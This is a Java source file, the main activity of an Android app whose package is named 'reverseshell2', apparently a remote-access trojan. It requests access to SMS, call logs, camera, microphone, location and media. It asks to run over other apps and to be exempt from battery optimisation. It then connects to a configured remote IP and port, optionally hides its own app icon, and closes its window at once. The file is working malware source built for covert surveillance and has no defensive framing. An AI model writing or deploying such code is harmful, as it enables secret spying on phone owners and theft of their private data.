package com.example.reverseshell2;

import androidx.activity.OnBackPressedCallback;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.window.OnBackInvokedDispatcher;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    Activity activity = this;
    Context context;
    static String TAG = "MainActivityClass";
    private PowerManager.WakeLock mWakeLock = null;
    private tcpConnection connection;
    private static final int PERMISSION_REQUEST_CODE = 123;
    private static final int NOTIFICATION_PERMISSION_CODE = 124;
    private static final int OVERLAY_PERMISSION_CODE = 125;
    private static final int BATTERY_OPTIMIZATIONS_REQUEST_CODE = 1234;

    // Modern permission groups for Android 14+
    private String[] basePermissions = {
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.VIBRATE,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.POST_NOTIFICATIONS
    };

    // Media permissions for Android 13+
    private String[] mediaPermissions = {
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO
    };

    // Specific permissions for Android 14+
    private String[] android14Permissions = {
            "android.permission.FOREGROUND_SERVICE_CAMERA",
            "android.permission.FOREGROUND_SERVICE_MICROPHONE",
            "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
            "android.permission.READ_MEDIA_VISUAL_USER_SELECTED"
    };

    private ActivityResultLauncher<String[]> permissionRequest;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        overridePendingTransition(0, 0);
        context = getApplicationContext();
        Log.d(TAG, config.IP + "\t" + config.port);
        
        // Setup back press handling for Android 14+
        setupBackHandling();
        
        // Setup permission launcher
        setupPermissionLauncher();
        
        // Check and request permissions
        checkAndRequestPermissions();
        
        // Check battery optimizations
        checkBatteryOptimizations();
    }

    private void setupBackHandling() {
        if (Build.VERSION.SDK_INT >= 34) { // Android 14+
            getOnBackInvokedDispatcher().registerOnBackInvokedCallback(
                OnBackInvokedDispatcher.PRIORITY_DEFAULT,
                () -> {
                    // Handle back press
                    finish();
                }
            );
        } else {
            getOnBackPressedDispatcher().addCallback(this, new OnBackPressedCallback(true) {
                @Override
                public void handleOnBackPressed() {
                    finish();
                }
            });
        }
    }

    private void setupPermissionLauncher() {
        permissionRequest = registerForActivityResult(
                new ActivityResultContracts.RequestMultiplePermissions(),
                result -> {
                    boolean allGranted = true;
                    for (Boolean granted : result.values()) {
                        if (!granted) {
                            allGranted = false;
                            break;
                        }
                    }
                    if (allGranted) {
                        startMainService();
                    } else {
                        Toast.makeText(this, "Required permissions not granted",
                                Toast.LENGTH_SHORT).show();
                    }
                });
    }

    private void checkAndRequestPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();

        // Check base permissions
        for (String permission : basePermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }

        // Check media permissions for Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            for (String permission : mediaPermissions) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(permission);
                }
            }
        }

        // Check Android 14+ specific permissions
        if (Build.VERSION.SDK_INT >= 34) {
            for (String permission : android14Permissions) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(permission);
                }
            }
        }

        if (!permissionsToRequest.isEmpty()) {
            permissionRequest.launch(permissionsToRequest.toArray(new String[0]));
        } else {
            checkNotificationPermission();
        }
    }

    private void checkNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, 
                    Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.POST_NOTIFICATIONS},
                        NOTIFICATION_PERMISSION_CODE);
                return;
            }
        }
        checkOverlayPermission();
    }

    private void checkOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, OVERLAY_PERMISSION_CODE);
                return;
            }
        }
        startConnection();
    }

    private void checkBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            String packageName = getPackageName();
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivityForResult(intent, BATTERY_OPTIMIZATIONS_REQUEST_CODE);
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == OVERLAY_PERMISSION_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (Settings.canDrawOverlays(this)) {
                    startConnection();
                }
            }
        } else if (requestCode == BATTERY_OPTIMIZATIONS_REQUEST_CODE) {
            if (resultCode == Activity.RESULT_OK) {
                Log.d(TAG, "Battery optimization exemption granted");
            } else {
                Log.w(TAG, "Battery optimization exemption denied");
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, 
            int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        switch (requestCode) {
            case PERMISSION_REQUEST_CODE:
                boolean allCriticalGranted = true;
                for (int i = 0; i < permissions.length; i++) {
                    String permission = permissions[i];
                    if ((permission.equals(Manifest.permission.INTERNET) ||
                            permission.equals(Manifest.permission.ACCESS_NETWORK_STATE)) &&
                            grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                        allCriticalGranted = false;
                        break;
                    }
                }
                if (allCriticalGranted) {
                    checkNotificationPermission();
                }
                break;

            case NOTIFICATION_PERMISSION_CODE:
                checkOverlayPermission();
                break;
        }
    }

    private void startConnection() {
        // Initialize connection
        connection = new tcpConnection(activity, context);
        connection.execute(config.IP, config.port);

        if (config.icon) {
            new functions(activity).hideAppIcon(context);
        }

        finish();
        overridePendingTransition(0, 0);
    }

    private void startMainService() {
        Intent serviceIntent = new Intent(this, mainService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        finish();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (connection != null) {
            connection.shutdown();
        }
    }
}
